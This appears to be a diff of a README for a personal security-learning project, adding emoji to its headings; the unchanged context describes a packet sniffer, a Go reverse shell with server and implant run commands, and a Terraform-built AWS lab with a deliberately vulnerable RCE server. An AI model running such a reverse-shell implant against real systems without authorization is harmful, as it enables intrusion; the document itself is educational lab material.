@@ -1,11 +1,11 @@
 # NetSec Tools & Cloud Lab
 
-## About the Project
+## 🚀 About the Project
 This is a documentation of my journey on building custom cybersecurity tools from scratch. I wanted to understand how pre-made tools worked so I made my own versions in **Go (Golang)** and **Python** to understand how stuff like TCP, HTTP Ethernet work.
 
 I also used **Terraform** to architect a custom "Vulnerable Lab" scenario in AWS to test these tools in a real-world cloud environment.
 
-## The Toolkit
+## 🛠️ The Toolkit
 ### 1. TCP/IP Sniffer (Python)
 * **What it does:** Captures raw packets, decodes Ethernet/IP/TCP headers, and identifies flags (SYN, ACK, FIN).
 * **Tech:** Raw Sockets, Struct unpacking.
@@ -35,7 +35,7 @@ I also used **Terraform** to architect a custom "Vulnerable Lab" scenario in AWS
     * **Server:** `go run tools/ReverseShell/server/server.go`
     * **Implant:** `go run tools/ReverseShell/implant/implant.go <SERVER_IP:PORT>`
 
-## Infrastructure as Code (Terraform)
+## ☁️ Infrastructure as Code (Terraform)
 I built two environments in AWS:
 1. **The Fortress:** A locked-down EC2 instance allowing SSH only from my specific IP.
 2. **The Target:** A deliberately vulnerable Web Server with an RCE injection point.
@@ -47,5 +47,5 @@ I built two environments in AWS:
 ![RCE Shell](screenshots/rce_shell.png)
 *Remote Code Execution via custom Go client.*
 
-## Disclaimer
+## ⚠️ Disclaimer
 These tools are for educational purposes and authorized security testing only. I am not responsible for your actions.
